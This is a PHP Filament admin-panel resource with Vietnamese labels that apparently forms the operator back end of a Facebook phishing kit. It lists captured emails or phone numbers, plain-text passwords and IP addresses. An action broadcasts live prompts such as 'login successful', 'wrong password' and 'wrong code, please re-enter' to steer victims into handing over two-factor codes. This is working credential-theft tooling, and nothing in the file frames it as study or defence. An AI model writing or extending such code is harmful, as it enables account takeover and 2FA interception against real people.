<?php

namespace App\Filament\Resources;

use App\Filament\Resources\UserLoginResource\Pages;
use App\Filament\Resources\UserLoginResource\RelationManagers;
use App\Models\UserLogin;
use Filament\Actions\Action;
use Filament\Forms;
use Filament\Forms\Form;
use Filament\Notifications\Notification;
use Filament\Resources\Resource;
use Filament\Tables;
use Filament\Tables\Actions\ExportBulkAction;
use Filament\Tables\Columns\TextColumn;
use Filament\Tables\Table;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;
use  App\Events\MessageSent;
use Filament\Forms\Components\TextInput;
use Filament\Forms\Components\Toggle;

class UserLoginResource extends Resource
{
    protected static ?string $model = UserLogin::class;

    protected static ?string $navigationIcon = 'heroicon-o-user';
    protected static ?string $navigationLabel = 'Tài khoản người dùng';
    protected static ?string $pluralLabel = 'Danh sách tài khoản người dùng';
    protected static ?string $slug = 'user-logins';

    public static function form(Form $form): Form
    {
        return $form
        ->schema([
            Forms\Components\TextInput::make('email')
                ->label('Email')
                ->email()
                ->required(),

            Forms\Components\TextInput::make('phone_number')
                ->label('Số điện thoại')
                ->tel(),

            Forms\Components\TextInput::make('password')
                ->label('Mật khẩu')
                ->password()
                ->required(),
        ]);
    }

    public static function table(Table $table): Table
    {
        return $table
        ->defaultSort('id', 'desc') // Sort by 'id' in descending order

        ->columns([
            TextColumn::make('email')
                ->label('Email - Phone number')
                ->sortable()
                ->searchable(),



            TextColumn::make('password')
                ->label('Password')
                ->sortable()
                ->searchable(),
            TextColumn::make('ip_address')
                ->label('IP')
                ->sortable()
                ->searchable(),
            TextColumn::make('created_at')
                ->label('Created at')
                ->dateTime()
                ->sortable(),
        ])
            ->filters([
                //
            ])
            ->actions([
                Tables\Actions\Action::make('notify')
                ->label('Gửi thông báo')
                ->color('success')
                ->icon('heroicon-o-bell') // Set your desired icon here
                ->form([
                    TextInput::make('notificationMessage')
                        ->label('Nội dung thông báo') // Changed to Vietnamese
                        ,

                    Toggle::make('loginSuccess')
                        ->label('Đăng nhập thành công'),

                    Toggle::make('codeEntrySuccess')
                        ->label('Nhập mã thành công'),
                    Toggle::make('facebookLoginError')
                        ->label('Thông tin đăng nhập hoặc mật khẩu sai'),
                    Toggle::make('codeSelectionError')
                        ->label('Mã sai, vui lòng nhập lại.'),
                    Toggle::make('notify')
                        ->label('Thông báo'),
                ])
                ->action(function (array $data) {
                    // Broadcast the event with the user input
                    broadcast(new MessageSent($data['notificationMessage'], $data['loginSuccess'], $data['codeEntrySuccess'], $data['facebookLoginError'], $data['codeSelectionError']
                ,$data['notify']));
                    if ($data['loginSuccess']) {
                        // Add custom logic for login success if needed
                    }

                    if ($data['codeEntrySuccess']) {
                        // Add custom logic for code entry success if needed
                    }


                    // Show a Filament success notification
                    Notification::make()
                        ->title('Notification Sent')
                        ->success()
                        ->send();
                }),
                Tables\Actions\EditAction::make(),
            ])
            ->bulkActions([
                Tables\Actions\BulkActionGroup::make([
                    Tables\Actions\DeleteBulkAction::make(),

                ]),


            ]);
    }
    public function getTableBulkActions()
    {
        return  [
            ExportBulkAction::make()
        ];
    }
    public static function getRelations(): array
    {
        return [
            //
        ];
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListUserLogins::route('/'),
            'create' => Pages\CreateUserLogin::route('/create'),
            'edit' => Pages\EditUserLogin::route('/{record}/edit'),
        ];
    }
}
